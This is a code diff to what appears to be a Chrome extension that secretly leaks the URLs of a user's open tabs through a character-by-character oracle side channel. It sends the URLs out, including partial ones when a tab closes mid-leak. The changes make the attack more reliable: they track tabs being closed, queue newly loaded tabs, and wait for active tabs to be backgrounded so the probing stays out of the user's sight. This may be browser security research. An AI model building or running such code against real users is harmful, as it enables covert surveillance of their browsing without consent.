@@ -32,7 +32,7 @@ const publishStatus = () => {
             prefix:      currentLeakScheme ? currentLeakScheme + currentLeakPrefix : currentLeakPrefix,
             charPos:     currentLeakPrefix.length,
             maxLen:      MAX_LEN,
-            queueLen:    queue.length,
+            queueLen:    queue.length + waitingForBackground.size,
             ts:          Date.now()
         }
     });
@@ -218,7 +218,8 @@ const leak = async (tabId) => {
     if (!scheme) {
         scheme = await detectScheme(tabId);
         if (abortLeak) {
-            partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
+            if (!closingTabs.has(tabId))
+                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
             return "";
         }
         if (!scheme) {
@@ -232,15 +233,19 @@ const leak = async (tabId) => {
     currentLeakPrefix = out;
     for (let i = out.length; i < MAX_LEN; i++) {
         if (abortLeak) {
-            // Save progress for later resume
-            partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
-            console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
+            // Save progress for later resume (unless the tab was closed)
+            if (!closingTabs.has(tabId)) {
+                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
+                console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
+            }
             break;
         }
         const c = await leakChar(scheme, out, tabId);
         if (abortLeak) {
-            partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
-            console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
+            if (!closingTabs.has(tabId)) {
+                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
+                console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
+            }
             break;
         }
         if (!c) break;
@@ -313,6 +318,9 @@ const exfiltrate = async (urls, partial = false) => {
 
 // Track which tabs have already been leaked so we don't repeat
 const leakedTabs = new Set();
+
+// Tabs that were closed while being actively leaked — don't save partial progress for these
+const closingTabs = new Set();
 
 // Listen for pause/resume commands from the popup
 chrome.storage.onChanged.addListener((changes, area) => {
@@ -409,12 +417,22 @@ const processQueue = async () => {
     publishStatus();
 };
 
-// On user navigation, re-leak that tab if it's in the background
+// On user navigation / new tab load, queue for leaking
 chrome.tabs.onUpdated.addListener(async (tabId, info) => {
-    if (info.status === "complete" && !leaking) {
+    if (info.status === "complete") {
+        if (tabId === currentLeakTabId) return; // ignore oracle reloads on the tab being probed
+        if (leakedTabs.has(tabId)) return;      // already done
         let tab;
         try { tab = await chrome.tabs.get(tabId); } catch { return; }
-        if (tab.active) return; // skip the active/foreground tab
+        if (tab.active) {
+            // Tab is active — park it so it's queued when the user switches away
+            if (!waitingForBackground.has(tabId) && !queue.includes(tabId)) {
+                console.log(`[*] New/navigated active tab ${tabId} — will queue when backgrounded`);
+                waitingForBackground.add(tabId);
+                publishStatus();
+            }
+            return;
+        }
         leakedTabs.delete(tabId); // URL may have changed
         console.log("[*] Background navigation detected on tab", tabId);
         enqueue(tabId);
@@ -427,6 +445,7 @@ chrome.tabs.onRemoved.addListener(async (tabId) => {
     if (currentLeakTabId === tabId && currentLeakPrefix) {
         const partial = (currentLeakScheme || "") + currentLeakPrefix;
         console.log(`[!] Tab ${tabId} closed mid-leak — exfiltrating partial: ${partial}`);
+        closingTabs.add(tabId); // prevent leak() from saving partialProgress
         abortLeak = true;
         await exfiltrate([partial], true);
     } else if (partialProgress.has(tabId)) {
@@ -441,6 +460,11 @@ chrome.tabs.onRemoved.addListener(async (tabId) => {
     leakedTabs.delete(tabId);
     partialProgress.delete(tabId);
     waitingForBackground.delete(tabId);
+    closingTabs.delete(tabId);
+    // Remove from queue if waiting to be leaked
+    const qi = queue.indexOf(tabId);
+    if (qi !== -1) queue.splice(qi, 1);
+    publishStatus();
 });
 
 // When a tab becomes active, abort if we're leaking it.
@@ -463,6 +487,7 @@ chrome.tabs.onActivated.addListener(({ tabId }) => {
             enqueue(deferredId);
         }
     }
+    publishStatus();
 });
 
 // On startup, restore paused state then queue background tabs (default: paused)
